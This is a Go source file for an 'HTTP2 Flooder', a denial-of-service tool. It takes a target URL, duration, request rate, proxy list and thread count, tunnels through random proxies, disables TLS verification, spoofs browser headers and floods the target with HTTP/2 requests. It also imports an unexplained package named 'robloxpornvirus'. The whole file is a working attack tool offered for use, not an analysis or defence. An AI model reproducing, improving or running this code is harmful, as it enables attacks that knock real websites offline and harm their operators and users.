package main

import (
    "fmt"
    "net/url"
    "time"
    "os"
    "strconv"
    "crypto/tls"
    "math/rand"
    "net"
    "bufio"
    "strings"
    "sync"
    "github.com/valyala/fasthttp"
    "github.com/dgrr/http2"
    "robloxpornvirus"
)

var proxies = []string{}

func FasthttpHTTPDialer(proxy string) fasthttp.DialFunc {
	return func(addr string) (net.Conn, error) {

		conn, err := fasthttp.Dial(proxy)
		if err != nil {
			return nil, err
		}

		req := "CONNECT " + addr + " HTTP/1.1\r\n"
		req += "\r\n"

		if _, err := conn.Write([]byte(req)); err != nil {
			return nil, err
		}

		res := fasthttp.AcquireResponse()
		defer fasthttp.ReleaseResponse(res)

		res.SkipBody = true

		if err := res.Read(bufio.NewReader(conn)); err != nil {
			conn.Close()
			return nil, err
		}
		if res.Header.StatusCode() != 200 {
			conn.Close()
			return nil, fmt.Errorf("could not connect to proxy")
		}
		return conn, nil
	}
}

func http2flood(target string, rps int) {
    restart: 
    u, _ := url.Parse(target)
    hostname := u.Hostname()
    client := &fasthttp.HostClient{
      Dial: FasthttpHTTPDialer(proxies[rand.Intn(len(proxies))]),
      Addr: hostname+":443",
    }
    http2.ConfigureClient(client, http2.ClientOpts{})
    client.TLSConfig = &tls.Config{
        InsecureSkipVerify: true,
        MinVersion:         tls.VersionTLS12,
        NextProtos:         []string{"h2"},
        CurvePreferences: []tls.CurveID{
            tls.X25519,
            tls.CurveP256,
            tls.CurveP384,
            tls.CurveP521,
        },
        CipherSuites: []uint16{
            tls.TLS_AES_128_GCM_SHA256,
            tls.TLS_AES_256_GCM_SHA384,
            tls.TLS_CHACHA20_POLY1305_SHA256,
            tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
            tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
        },
        PreferServerCipherSuites: true,
    }

    req := fasthttp.AcquireRequest()
    req.SetRequestURI(target)
    resp := fasthttp.AcquireResponse()
    version := rand.Intn(20) + 95
    userAgents := []string{fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%d.0) Gecko/20100101 Firefox/%d.0", version, version), fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", version)}
    userAgent := rand.Intn(len(userAgents))
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("Accept-Language", "de,en-US;q=0.7,en;q=0.3")
    req.Header.Set("Cache-Control", "no-cache")
    req.Header.Set("Connection", "keep-alive")
    req.Header.Set("Pragma", "no-cache")
    req.Header.Set("Upgrade-Insecure-Requests", "1")
    req.Header.Set("User-Agent", userAgents[userAgent])
    req.Header.Set("Sec-Fetch-Dest", "document")
    req.Header.Set("Sec-Fetch-Mode", "navigate")
    req.Header.Set("Sec-Fetch-Site", "none")
    req.Header.Set("Sec-Fetch-User", "?1")
    req.Header.Set("X-Requested-With", "XMLHttpRequest")
    for i := 0; i < rps; i++ {
        err := client.Do(req, resp)
        if err != nil {
            goto restart
        }
        if resp.StatusCode() >= 400 && resp.StatusCode() != 404 {
            goto restart
        }
    }
}


func main() {
    go func() {
      rand.Seed(time.Now().UnixNano())
    }()
    if len(os.Args) < 6 {
        fmt.Println(fmt.Sprintf("\033[34mHTTP2 Flooder \033[0m- \033[33mMade by @udbnt\033[0m\n\033[31m%s target, duration, rps, proxylist, threads\033[0m", os.Args[0]))
        return
    }
    var target string
    var duration int
    var rps int
    var proxylist string
    var threads int
    target = os.Args[1]
    duration, _ = strconv.Atoi(os.Args[2])
    rps, _ = strconv.Atoi(os.Args[3])
    proxylist = os.Args[4]
    threads, _ = strconv.Atoi(os.Args[5])

    file, err := os.Open(proxylist)
    if err != nil {
        fmt.Println("Error reading file:", err)
        return
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        proxies = append(proxies, strings.TrimSpace(scanner.Text()))
    }

    if len(proxies) == 0 {
        fmt.Println("No proxies found in the file")
        return
    }

    var wg sync.WaitGroup
    for i := 0; i < threads; i++ {
        wg.Add(1)
        defer wg.Done()
        go http2flood(target, rps)
        time.Sleep(time.Duration(1) * time.Millisecond)
    }

    time.Sleep(time.Duration(duration) * time.Second)
    wg.Wait()
}
